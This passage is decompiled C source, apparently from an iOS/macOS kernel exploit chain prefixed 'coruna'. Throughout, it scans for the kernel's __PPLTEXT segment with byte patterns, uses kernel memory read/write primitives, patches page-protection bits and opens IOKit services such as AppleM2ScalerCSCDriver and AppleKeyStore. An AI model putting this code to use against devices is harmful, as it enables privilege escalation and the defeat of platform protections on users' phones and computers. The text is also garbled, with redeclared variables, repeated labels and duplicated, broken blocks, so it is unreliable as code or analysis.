  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  handle = *(long *)(handle + 8);
  size = *(uint64_t *)(handle + 0x20);
  u = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(handle,*(long *)(handle + 0x10) + 0x28);
  handle = coruna_kernel509_via_fn_ptr_cast_10_10(size,u);
  handle = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*(uint64_t *)(handle + 8),handle + 0x18);
  ptr = k_kernel_mach_task_self_slot;
  while( true ) {
    off = handle;
    address = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*(uint64_t *)(handle + 8),off + 0x10);
    addr = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*(uint64_t *)(handle + 8),off + 0x18);
    err = coruna_kernel509_residual_294(*(uint64_t *)(handle + 8),off + 0x48);
    if (address == 0x1000000000) break;
    handle = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*(uint64_t *)(handle + 8),off + 8);
    if (err < 0) {
      scratch = 0;
      scratch = 0;
      bootargs = 0;
      bootargs = 0;
      off = off + 0x30;
      coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub(*(uint64_t *)(handle + 8),off,&scratch,0x20,1);
      scratch = coruna_u64_pack(((int)*(uint64_t *)(handle + 0x20)), ((uint32_t))scratch);
      coruna_call_call_mach_vm_machine_attribute_1d4f8_2b614(*(uint64_t *)(handle + 8),off,&scratch,0x20,1);
      scratch = 0;
      scratch = 0;
      bootargs = 0;
      bootargs = 0;
      coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub(*(uint64_t *)(handle + 8),off,&scratch,0x20,1);
      bootargs = coruna_u64_pack((bootargs), (err)) & 0xffffffff7fffffff;
      coruna_call_call_mach_vm_machine_attribute_1d4f8_2b614(*(uint64_t *)(handle + 8),off,&scratch,0x20,1);
      _vm_deallocate(*(vm_map_t *)ptr,address,addr - address);
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != thread_attr) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_cfdictionaryapplyfunction(long handle,long addr_2)
{
  long handle;
  long addr;
  uint64_t u;
  uint32_t scratch[2];
  long bootargs;
  
  if (handle != 0) {
    handle = _CFGetTypeID();
    addr = _CFDictionaryGetTypeID();
    if ((handle == addr) && (addr_2 != 0)) {
      handle = _CFGetTypeID(addr_2);
      addr = _CFDictionaryGetTypeID();
      if (handle == addr) {
        scratch[0] = 0;
        bootargs = handle;
        u = coruna_kernel509_via_helper_5d2c_419fc(coruna_cfdictionarygetvalueifpresent);
        _CFDictionaryApplyFunction(addr_2,u,scratch);
      }
    }
  }
  return;
}
void coruna_cfdictionarygetvalueifpresent(long handle,long addr_2,int *flags)
{
  int err;
  long handle;
  long addr;
  long off;
  uint64_t u;
  uint64_t size;
  long scratch;
  int bootargs [2];
  long thread_attr;
  
  if (flags == (int *)0x0) {
    return;
  }
  if (*flags != 0) {
    return;
  }
  if ((handle == 0) || (addr_2 == 0)) {
    err = 0xad001;
  }
  else {
    handle = _CFGetTypeID(addr_2);
    addr = _CFStringGetTypeID();
    if ((((addr == handle) || (addr = _CFArrayGetTypeID(), addr == handle)) ||
        (addr = _CFBooleanGetTypeID(), addr == handle)) ||
       (addr = _CFNumberGetTypeID(), addr == handle)) {
      scratch = 0;
      err = _CFDictionaryGetValueIfPresent(*(uint64_t *)(flags + 2),handle,&scratch);
      if (err == 0) {
fail:
        if (*flags != 0) {
          return;
        }
        _CFDictionarySetValue(*(uint64_t *)(flags + 2),handle,addr_2);
        return;
      }
      handle = _CFGetTypeID(scratch);
      addr = _CFGetTypeID(addr_2);
      if (addr == handle) {
        off = _CFArrayGetTypeID();
        addr = scratch;
        if (off == handle) {
          err = 0xad001;
          if (scratch != 0) {
            handle = _CFGetTypeID(scratch);
            off = _CFArrayGetTypeID();
            if (handle == off) {
              handle = _CFGetTypeID(addr_2);
              off = _CFArrayGetTypeID();
              if (handle == off) {
                handle = _CFGetTypeID(addr_2);
                off = _CFArrayGetTypeID();
                err = 0xad001;
                if (handle == off) {
                  bootargs[0] = coruna_cat(bootargs[0],1);
                  u = _CFArrayGetCount(addr_2);
                  size = coruna_kernel509_via_helper_5d2c_419fc(coruna_cfstringgettypeid);
                  _CFArrayApplyFunction(addr_2,0,u,size,bootargs);
                  if ((char)bootargs[0] == '\0') {
                    err = 0xad014;
                  }
                  else {
                    bootargs[0] = 0;
                    thread_attr = addr;
                    u = _CFArrayGetCount(addr_2);
                    size = coruna_kernel509_via_helper_5d2c_419fc(coruna_cfarraycontainsvalue);
                    _CFArrayApplyFunction(addr_2,0,u,size,bootargs);
                    err = bootargs[0];
                  }
                }
              }
            }
          }
          *flags = err;
          return;
        }
        if (*flags != 0) {
        return;
        }
        _CFDictionarySetValue(*(uint64_t *)(flags + 2),handle,addr_2);
        return;
      }
    }
    err = 0xad014;
  }
  *flags = err;
  return;
}
void coruna_cfdictionaryapplyfunction_150e8(long handle,long addr_2)
{
  long handle;
  long addr;
  uint64_t u;
  uint32_t scratch[2];
  long bootargs;
  
  if (handle != 0) {
    handle = _CFGetTypeID();
    addr = _CFDictionaryGetTypeID();
    if ((handle == addr) && (addr_2 != 0)) {
      handle = _CFGetTypeID(addr_2);
      addr = _CFDictionaryGetTypeID();
      if (handle == addr) {
        scratch[0] = 0;
        bootargs = handle;
        u = coruna_kernel509_via_helper_5d2c_419fc(coruna_cfdictionarygetvalueifpresent_104e8);
        _CFDictionaryApplyFunction(addr_2,u,scratch);
      }
    }
  }
  return;
}
void coruna_cfdictionarygetvalueifpresent_104e8(long handle,long addr_2,int *flags)
{
  int err;
  long handle;
  long addr;
  uint64_t u;
  uint64_t size;
  int scratch [2];
  uint64_t bootargs;
  uint64_t thread_attr;
  
  if (flags == (int *)0x0) {
    return;
  }
  if (*flags != 0) {
    return;
  }
  if ((handle == 0) || (addr_2 == 0)) {
    scratch[0] = 0xad001;
  }
  else {
    thread_attr = 0;
    err = _CFDictionaryGetValueIfPresent(*(uint64_t *)(flags + 2),handle,&thread_attr);
    if (err == 0) {
      scratch[0] = 0xad011;
    }
    else {
      handle = _CFGetTypeID(thread_attr);
      addr = _CFGetTypeID(addr_2);
      if (addr == handle) {
        addr = _CFArrayGetTypeID();
        if (addr == handle) {
          scratch[0] = 0;
          bootargs = thread_attr;
          u = _CFArrayGetCount(addr_2);
          size = coruna_kernel509_via_helper_5d2c_419fc(coruna_cfarraycontainsvalue_10718);
          _CFArrayApplyFunction(addr_2,0,u,size,scratch);
          *flags = scratch[0];
          return;
        }
        err = _CFEqual(addr_2,thread_attr);
        if (err != 0) {
          *flags = 0;
          return;
        }
      }
      scratch[0] = 0xad014;
    }
  }
fail:
  *flags = scratch[0];
  return;
}
void coruna_cfarraycontainsvalue(long handle,int *flags)
{
  int err;
  uint64_t u;
  uint64_t size;
  
  if ((flags != (int *)0x0) && (*flags == 0)) {
    if (handle == 0) {
      *flags = 0xad001;
    }
    else {
      size = *(uint64_t *)(flags + 2);
      u = _CFArrayGetCount(size);
      err = _CFArrayContainsValue(size,0,u,handle);
      if (err == 0) {
        _CFArrayAppendValue(*(uint64_t *)(flags + 2),handle);
      }
    }
  }
  return;
}
void coruna_cfstringgettypeid(long handle,uint8_t *buf)
{
  long handle;
  long addr;
  
  if (buf != (uint8_t *)0x0) {
    if (handle != 0) {
      handle = _CFGetTypeID();
      addr = _CFStringGetTypeID();
      if (handle == addr) {
        return;
      }
    }
    *buf = 0;
  }
  return;
}
void coruna_cfarraycontainsvalue_10718(long handle,int *flags)
{
  int err;
  uint64_t u;
  uint64_t size;
  
  if ((flags != (int *)0x0) && (*flags == 0)) {
    err = 0xad001;
    if (handle != 0) {
      size = *(uint64_t *)(flags + 2);
      u = _CFArrayGetCount(size);
      err = _CFArrayContainsValue(size,0,u,handle);
      if (err != 0) {
        return;
      }
      err = 0xad011;
    }
    *flags = err;
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10(long handle)
{
  int err;
  
  err = coruna_fn_ptr_cast_10(handle,0x5184000);
  if (((err == 0) ||
      ((*(unsigned long *)(handle + 0x158) < 0x2712000c700000 &&
       ((*(unsigned long *)(handle + 0x158) < 0x225c2380100000 || (0x2711 < *(int *)(handle + 0x140)))))))
     && ((err = coruna_fn_ptr_cast_10(handle,0x5100000), err == 0 ||
         ((*(unsigned long *)(handle + 0x158) < 0x27120007400000 &&
          ((*(unsigned long *)(handle + 0x158) < 0x225c1e80500000 || (0x2711 < *(int *)(handle + 0x140))))
          ))))) {
    err = coruna_fn_ptr_cast_10(handle,0x5184000);
    if (((err == 0) ||
        ((*(unsigned long *)(handle + 0x158) < 0x2712000c700000 &&
         ((*(unsigned long *)(handle + 0x158) < 0x225c2380100000 || (0x2711 < *(int *)(handle + 0x140)))))
        )) && ((err = coruna_fn_ptr_cast_10(handle,0x5100000), err == 0 ||
               ((*(unsigned long *)(handle + 0x158) < 0x27120007400000 &&
                ((*(unsigned long *)(handle + 0x158) < 0x225c1e80500000 ||
                 (0x2711 < *(int *)(handle + 0x140))))))))) {
      coruna_fn_ptr_cast_4(handle);
    }
  }
  else {
    coruna_bzero_22b70(handle);
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_2(uint64_t val)
{
  coruna_fn_ptr_cast_10(val,0x5184001);
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614_2(long handle,unsigned long arg,long addr_2,unsigned long arg)
{
  unsigned long u;
  uint size;
  unsigned long version;
  int err;
  unsigned long port;
  unsigned long tag;
  long handle;
  unsigned long kind;
  unsigned long type_id;
  unsigned long type_id_8;
  unsigned long scratch;
  uint64_t bootargs;
  unsigned long thread_attr;
  long host_info;
  
  thread_attr = 0;
  host_info = 0;
  scratch = 0;
  bootargs = 0;
  err = coruna_fn_ptr_cast_10(handle,0x5184001);
  if ((((err != 0) && (arg != 0)) && (addr_2 != 0)) && ((int)arg != 0)) {
    if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
      err = coruna_find_ppltext(handle,&thread_attr,(long)&bootargs + 4);
      version = thread_attr;
      if ((err != 0) && (thread_attr <= arg)) {
        u = arg + (arg & 0xffffffff);
        size = bootargs;
        type_id = (unsigned long)bootargs;
        if ((u <= thread_attr + type_id) && (err = coruna_kernel509_via_kernel509_via_vm_deallocate_2a1cc(handle,3,&host_info), err != 0))
        {
          if (host_info == 0) {
            kind = type_id + 8;
            if (size < 0x8c001 && *(long *)(handle + 0x158) + 0xffe7f6f5f8700000U < 0xf78900000) {
              kind = 0x8c008;
            }
            tag = (unsigned long)*(uint *)(handle + 0x180);
            port = 0;
            if (tag != 0) {
              port = kind / tag;
            }
            handle = kind - port * tag;
            err = 0;
            if (handle != 0) {
              err = *(uint *)(handle + 0x180) - (int)handle;
            }
            bootargs = coruna_u64_pack((bootargs), (int)kind + err);
            host_info = coruna_vm_deallocate_2a1cc(handle,&bootargs);
            if (host_info == 0) {
              return;
            }
            err = coruna_kernel509_via_kernel509_via_vm_deallocate_2a1cc_2(handle,3,host_info);
            if (err == 0) {
              return;
            }
          }
          port = *(unsigned long *)(handle + 0x188);
          for (kind = arg & (port ^ 0xffffffffffffffff);
              kind <= (u - 1 & (port ^ 0xffffffffffffffff));
              kind = kind + *(uint *)(handle + 0x180)) {
            err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,host_info + type_id,8,&scratch);
            if (err == 0) {
              return;
            }
            tag = kind - version;
            type_id_8 = (unsigned long)(1 << (unsigned long)((uint)(tag >> 0xe) & 0x1f));
            if ((scratch & type_id_8) == 0) {
              err = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_22818_2(handle,host_info + tag,kind);
              if (err == 0) {
                return;
              }
              scratch = scratch | type_id_8;
              err = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,host_info + type_id,&scratch,8);
              if (err == 0) {
                return;
              }
            }
          }
          coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,(arg - version) + host_info,addr_2,arg);
        }
      }
    }
    else {
      coruna_kernel509_via_kernel5_residual_251(handle,arg,addr_2,arg,0);
    }
  }
  return;
}
void coruna_kernel509_via_kernel5_residual_251(long handle,unsigned long arg,uint64_t val,unsigned long arg,uint64_t id_2)
{
  int err;
  uint u;
  unsigned long *ptr;
  unsigned long size;
  unsigned long version;
  long handle;
  long addr;
  unsigned long port;
  uint scratch;
  long bootargs;
  
  err = coruna_mach_absolute_time_1a9c0(handle,5,&k_kernel_slot_2710);
  if (err != 0) {
    return;
  }
  bootargs = 0;
  version = arg & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff);
  if (version == ((arg + (arg & 0xffffffff)) - 1 &
               (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff))) {
    u = 0x100;
    if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
      u = 0x10;
    }
    port = (unsigned long)u;
    ptr = (unsigned long *)(handle + 0x878);
    size = port;
    do {
      if (*ptr == 0) break;
      if ((version == *ptr) && (ptr[-1] != 0)) {
        handle = (arg - version) + ptr[-1];
        goto fail;
      }
      ptr = ptr + 2;
      size = size - 1;
    } while (size != 0);
    err = coruna_kernel509_via_kernel509_via_vm_deallocate_2a1cc(handle,7,&bootargs);
    if (err != 0) {
      if (bootargs == 0) {
        scratch = u << 4;
        size = (unsigned long)scratch;
        bootargs = coruna_vm_deallocate_2a1cc(handle,&scratch);
        if ((bootargs == 0) || (err = coruna_kernel509_via_kernel509_via_vm_deallocate_2a1cc_2(handle,7,bootargs), err == 0))
        coruna_kernel5_residual_251(handle,5);
        return;
      }
      else {
        err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,bootargs,u << 4,(void *)(handle + 0x870));
        coruna_kernel5_residual_251(handle,5);
        return;
      }
      addr = 0x870;
      do {
        size = *(unsigned long *)(handle + addr + 8);
        if (size == 0) {
          scratch = *(uint *)(handle + 0x180);
          handle = coruna_mach_port_request_notification_29a50(handle,&scratch);
          if (((handle != 0) && (scratch == *(uint *)(handle + 0x180))) &&
             (err = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_22818_2(handle,handle,version), err != 0)) {
            *(unsigned long *)(handle + addr + 8) = version;
            *(long *)(handle + addr) = handle;
            err = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,bootargs + (addr - 0x870U & 0xffffffff0),
                                 (long *)(handle + addr),0x10);
            if (err != 0) {
cleanup:
              handle = (arg - version) + handle;
fail:
              err = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b508(handle,handle,val,arg,id_2);
              if (err != 0) {
                coruna_kernel5_residual_251(handle,5);
                return;
              }
            }
          }
          break;
        }
        handle = (arg - version) + handle;
        addr = addr + 0x10;
        port = port - 1;
      } while (port != 0);
    }
  }
done:
  coruna_kernel5_residual_251(handle,5);
  return;
}
void coruna_find_ppltext(long handle,long *addr_2,int *flags)
{
  bool err;
  long handle;
  int err;
  int status;
  unsigned long u;
  long addr;
  char *ptr;
  uint64_t scratch;
  long bootargs;
  unsigned long thread_attr;
  uint64_t host_info;
  long serial_buf;
  unsigned long action;
  
  addr = *(long *)(&k_kernel_slot_1888 + handle);
  if (addr != 0) {
    err = *(int *)(&k_kernel_slot_1890 + handle);
    *addr_2 = addr;
    *flags = err;
    return;
  }
  err = *(int *)(*(long *)(&k_kernel_slot_19f8 + handle) + 0x70);
  if (err < 0x2258) {
    ptr = "1F 01 13 EB 20 91 53 FA .. .. 00 54 68 02";
    }
    check_ok:
    coruna_macho_find_loadcmd(&host_info,*(long *)(&k_kernel_slot_19f8 + handle),"__PPLTEXT");
    if ((0x180919801fffff < *(unsigned long *)(handle + 0x158)) && (*(int *)(handle + 0x140) < 0x1c1b)) {
    if (serial_buf == 0) {
    return;
    }
    u = (unsigned long)*(uint *)(handle + 0x180);
    err = action < u;
    action = action - u;
    if (err || action == 0) {
    return;
    }
    serial_buf = serial_buf + u;
    }
    bootargs = serial_buf;
    scratch = host_info;
    thread_attr = action;
    handle = coruna_strsep(&scratch,ptr,0,1);
    if (handle == 0) {
    return;
      }
      check_ok:
      coruna_macho_find_loadcmd(&host_info,*(long *)(&k_kernel_slot_19f8 + handle),"__PPLTEXT");
      if ((0x180919801fffff < *(unsigned long *)(handle + 0x158)) && (*(int *)(handle + 0x140) < 0x1c1b)) {
      if (serial_buf == 0) {
      return;
    }
    ptr = "1F 01 .. EB 20 91 .. FA .. .. 00 54";
  }
  else {
    if (err != 0x2258 && err != 0x225c) {
      status = 0x2712;
cleanup:
      if (err != status) {
        ptr = (char *)0x0;
        coruna_macho_find_loadcmd(&host_info,*(long *)(&k_kernel_slot_19f8 + handle),"__PPLTEXT");
        if ((0x180919801fffff < *(unsigned long *)(handle + 0x158)) && (*(int *)(handle + 0x140) < 0x1c1b)) {
        if (serial_buf == 0) {
        return;
        }
        u = (unsigned long)*(uint *)(handle + 0x180);
        err = action < u;
        action = action - u;
        if (err || action == 0) {
        return;
        }
        serial_buf = serial_buf + u;
        }
        bootargs = serial_buf;
        scratch = host_info;
        thread_attr = action;
        handle = coruna_strsep(&scratch,ptr,0,1);
        if (handle == 0) {
        return;
        }
        addr = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -0x10);
        if (addr == 0) {
        addr = 0;
        }
        else {
        addr = coruna_helper_127b4_1b298_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr);
        }
        if (*(int *)(handle + 0x140) < 0x1c1b) {
        err = 0;
        }
        else {
        handle = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -8);
        if (handle == 0) {
        return;
        }
        handle = coruna_helper_127b4_1b298_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle);
        if (handle == 0) {
        return;
        }
        err = (int)handle - (int)addr;
        }
        if (addr == 0) {
        return;
        }
        if (*(int *)(handle + 0x140) < 0x1c1b) {
        if (*(int *)(handle + 0x140) < 0x1809) {
        err = 0x90000;
        }
        else {
        err = 0x88000;
        if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
        err = 0x8c000;
        }
        }
        }
        *(long *)(&k_kernel_slot_1888 + handle) = addr;
        *(int *)(&k_kernel_slot_1890 + handle) = err;
        *addr_2 = addr;
        *flags = err;
        return;
      }
    }
done:
    ptr = "1F 01 13 EB 20 91 53 FA .. .. 00 54 68 02";
  }
check_ok:
  coruna_macho_find_loadcmd(&host_info,*(long *)(&k_kernel_slot_19f8 + handle),"__PPLTEXT");
  if ((0x180919801fffff < *(unsigned long *)(handle + 0x158)) && (*(int *)(handle + 0x140) < 0x1c1b)) {
    if (serial_buf == 0) {
      return;
    }
    u = (unsigned long)*(uint *)(handle + 0x180);
    err = action < u;
    action = action - u;
    if (err || action == 0) {
      return;
    }
    serial_buf = serial_buf + u;
  }
  bootargs = serial_buf;
  scratch = host_info;
  thread_attr = action;
  handle = coruna_strsep(&scratch,ptr,0,1);
  if (handle == 0) {
    return;
  }
  addr = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -0x10);
  if (addr == 0) {
    addr = 0;
  }
  else {
    addr = coruna_helper_127b4_1b298_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr);
  }
  if (*(int *)(handle + 0x140) < 0x1c1b) {
    err = 0;
  }
  else {
    handle = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -8);
    if (handle == 0) {
      return;
    }
    handle = coruna_helper_127b4_1b298_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle);
    if (handle == 0) {
      return;
    }
    err = (int)handle - (int)addr;
  }
  if (addr == 0) {
    return;
  }
  if (*(int *)(handle + 0x140) < 0x1c1b) {
    if (*(int *)(handle + 0x140) < 0x1809) {
      err = 0x90000;
    }
    else {
      err = 0x88000;
      if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
        err = 0x8c000;
      }
    }
  }
  *(long *)(&k_kernel_slot_1888 + handle) = addr;
  *(int *)(&k_kernel_slot_1890 + handle) = err;
fail:
  *addr_2 = addr;
  *flags = err;
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_22818_2(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  unsigned long u;
  long handle;
  unsigned long size;
  int err;
  unsigned long version;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  unsigned long bootargs;
  long thread_attr [2];
  char host_info;
  uint64_t host_info;
  uint64_t serial_buf;
  unsigned long serial_buf;
  
  serial_buf = 0;
  thread_attr[1] = 0;
  thread_attr[0] = 0;
  serial_buf = 0;
  host_info = 0;
  bootargs = 0;
  scratch = 0;
  scratch = 0;
  thread_attr = 0;
  bootargs = 0;
  err = coruna_call_mach_vm_machine_attribute_1d4f8_22818(val,size_3,&scratch);
  u = bootargs;
  if (((((err != 0) && (bootargs == '\x03')) &&
       (err = coruna_call_mach_vm_machine_attribute_1d4f8_22818(val,id_2,thread_attr), size = serial_buf, handle = thread_attr[0],
       err != 0)) &&
      ((host_info == '\x03' &&
       ((u = serial_buf & 0x3fff | (u >> 0xe & 0x3ffffffff) << 0xe,
        version = serial_buf & 0xffff000000000000 | u, (int)u == (int)serial_buf ||
        (err = coruna_kernel509_via_fn_ptr_cast_10_4(val,thread_attr[0],version), err != 0)))))) &&
     ((size >> 0x20 == version >> 0x20 ||
      (err = coruna_kernel509_via_fn_ptr_cast_10_4(val,handle + 4,version >> 0x20), err != 0)))) {
    coruna_semaphore_timedwait(val,&k_kernel_slot_2710);
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_3(long handle,unsigned long arg,uint64_t val)
{
  int err;
  uint scratch;
  unsigned long bootargs;
  uint32_t thread_attr;
  
  thread_attr = (uint32_t)val;
  bootargs = 0;
  scratch = 0;
  err = coruna_fn_ptr_cast_10(handle,0x5184001);
  if (err == 0) {
    return;
  }
  if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
    err = coruna_find_ppltext(handle,&bootargs,&scratch);
    if (err == 0) {
      return;
    }
    if ((bootargs <= arg) && (arg + 4 <= bootargs + scratch)) {
      coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614_2(handle,arg,&thread_attr,4);
      return;
    }
  }
  coruna_kernel509_via_fn_ptr_cast_10_4(handle,arg,val);
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_4(long handle,uint64_t val,uint64_t id_2)
{
  int err;
  unsigned long u;
  
  err = coruna_fn_ptr_cast_10(handle,0x5184000);
  if (((err != 0) &&
      ((0x2712000c6fffff < *(unsigned long *)(handle + 0x158) ||
       ((0x225c23800fffff < *(unsigned long *)(handle + 0x158) && (*(int *)(handle + 0x140) < 0x2712))))))
     || ((err = coruna_fn_ptr_cast_10(handle,0x5100000), err != 0 &&
         ((0x271200073fffff < *(unsigned long *)(handle + 0x158) ||
          ((0x225c1e804fffff < *(unsigned long *)(handle + 0x158) && (*(int *)(handle + 0x140) < 0x2712)))
          ))))) {
    coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c(handle,val,id_2);
    return;
  }
  err = coruna_fn_ptr_cast_10(handle,0x5184000);
  if (err == 0) {
fail:
    err = coruna_fn_ptr_cast_10(handle,0x5100000);
    if (err != 0) {
      u = *(unsigned long *)(handle + 0x158);
      if (0x271200073fffff < u) {
        if (0x27120a807fffff < u) {
          return;
        }
        coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_22818(handle,val,id_2);
        return;
      }
      if ((0x225c1e804fffff < u) && (*(int *)(handle + 0x140) < 0x2712)) {
        coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_22818(handle,val,id_2);
        return;
      }
    }
    coruna_kernel509_via_fn_ptr_cast_10_7(handle,val,id_2);
  }
  else {
    u = *(unsigned long *)(handle + 0x158);
    if (u < 0x2712000c700000) {
      if ((u < 0x225c2380100000) || (0x2711 < *(int *)(handle + 0x140))) goto fail;
    }
    else {
done:
      if (0x27120a807fffff < u) {
        return;
      }
    }
cleanup:
    coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_22818(handle,val,id_2);
  }
  return;
}
void coruna_vm_deallocate_112cc(long handle,long addr_2,long off_3,uint size)
{
  long handle;
  uint u;
  uint8_t *ptr;
  kern_return_t lk4;
  int err;
  uint64_t size;
  unsigned long version;
  uint port;
  void *scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  lk4 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(vm_address_t *)&scratch,
                       (unsigned long)*(uint *)(handle + 0x180),1);
  if (lk4 == 0) {
    size = coruna_helper_2a918_3996c_stub(handle,addr_2);
    port = 0;
    while( true ) {
      handle = addr_2 + (unsigned long)port;
      u = *(int *)(handle + 0x180) - ((uint)handle & *(uint *)(handle + 0x188));
      if (size - port <= u) {
        u = size - port;
      }
      version = (unsigned long)u;
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle,version,scratch);
      if (err == 0) break;
      err = _memcmp(scratch,(void *)(off_3 + (unsigned long)port),version);
      if (((err != 0) &&
          (err = coruna_kernel509_via_kernel509_via_kernel5_residual_251(handle,handle,(void *)(off_3 + (unsigned long)port),version,size,0),
          err == 0)) || (port = u + port, port == size)) break;
    }
    _vm_deallocate(*(vm_map_t *)ptr,(vm_address_t)scratch,(unsigned long)*(uint *)(handle + 0x180));
  }
  return;
}
void coruna_helper_2a918_3996c_stub(uint64_t val,uint64_t id_2)
{
  coruna_helper_2a918_3996c(val,id_2,0,id_2);
  return;
}
void coruna_kernel509_via_kernel509_via_kernel5_residual_251(long handle,unsigned long arg,long addr_2,unsigned long arg,unsigned long val,
                 uint64_t val)
{
  int err;
  unsigned long u;
  uint64_t scratch[2];
  byte bootargs;
  uint thread_attr;
  
  if ((((arg != 0) && (addr_2 != 0)) && ((int)arg != 0)) &&
     (u = arg & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff),
     u == ((arg + (arg & 0xffffffff)) - 1 &
              (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff)))) {
    if ((val & 1) == 0) {
      err = coruna_call_mach_vm_machine_attribute_1d4f8_22818(handle,u,scratch);
      if ((err != 0) && ((bootargs | 2) == 3)) {
        if ((thread_attr >> 7 & 1) != 0) {
          err = coruna_kernel509_via_fn_ptr_cast_10_3(handle,scratch[0],thread_attr & 0xffffff7f);
          if (err == 0) {
            return;
          }
          coruna_semaphore_timedwait(handle,&k_kernel_slot_2710);
        }
        coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b508(handle,arg,addr_2,arg,val);
      }
    }
    else {
      coruna_kernel509_via_kernel5_residual_251(handle,arg,addr_2,arg,val);
    }
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_5(long handle,uint64_t val,long addr_2)
{
  int err;
  uint64_t u;
  long scratch;
  long bootargs;
  
  bootargs = addr_2;
  err = coruna_fn_ptr_cast_10(handle,0x5184001);
  if (((err != 0) && (err = coruna_kernel509_residual_307(handle,val,&scratch), err != 0)) &&
     (scratch != addr_2)) {
    u = coruna_helper_2a918_3996c_stub(handle,val);
    coruna_kernel509_via_kernel509_via_kernel5_residual_251(handle,val,&bootargs,*(uint32_t *)(handle + 0x168),u,1);
  }
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b508(long handle,uint64_t val,uint64_t id_2,int flags,int count_2)
{
  uint64_t scratch;
  
  if ((count_2 == 0) || (*(int *)(handle + 0x168) != flags)) {
    coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,val);
  }
  else {
    scratch = 0;
    ___memcpy_chk(&scratch,id_2,flags,8);
    coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,val,scratch);
  }
  return;
}
void coruna_cfpropertylistcreatewithdata(uint *size,unsigned long arg,char *path)
{
  uint u;
  uint8_t *ptr;
  int err;
  size_t ls4;
  void **lppv5;
  long handle;
  void *ptr;
  long addr;
  long off;
  char *ptr;
  uint64_t size;
  uint64_t scratch;
  long bootargs;
  uint *thread_attr;
  uint32_t host_info;
  long serial_buf;
  uint64_t action;
  uint32_t block_ctx;
  pthread_t stack_guard;
  uint8_t sa_saved[24];
  int sa_new [26];
  long path_buf;
  
  path_buf = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 100;
  bootargs = 0;
  if (0x1f52ffffffffff < *(unsigned long *)(size + 0x56)) {
    coruna_cfdatagetbyteptr(size,arg,path,1);
    if (*(long *)k_kernel_stack_chk_guard_slot == path_buf) {
    return;
    }
    ___stack_chk_fail();
  }
  err = coruna_mach_absolute_time_1a9c0(size,0,&k_kernel_slot_2710);
  if (*(long *)k_kernel_stack_chk_guard_slot == path_buf) {
  return;
  }
  ___stack_chk_fail();
}
void coruna_open_m2scaler(long *handle)
{
  int err;
  int status;
  int flags;
  long handle;
  uint64_t u;
  long addr;
  uint64_t size;
  long off;
  long base;
  uint32_t version;
  long *ptr;
  unsigned long scratch;
  long bootargs;
  long thread_attr;
  uint64_t host_info;
  int serial_buf;
  
  base = *handle;
  ptr = (long *)handle[2];
  serial_buf = 0;
  thread_attr = 0;
  host_info = 0;
  bootargs = 0;
  err = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_12(base,(int)handle[1]);
  if ((err != 0) && (handle = coruna_fn_ptr_cast_2(base,*(uint64_t *)(base + 0x390)), handle != 0)) {
    if (*(int *)(base + 0x140) < 0x1c1b) {
      u = coruna_ioservicegetmatchingservice_1a3ec("AppleM2ScalerCSCDriver");
fail:
      handle = 0;
    }
    else {
      u = coruna_ioservicegetmatchingservice_1a3ec("AppleKeyStore");
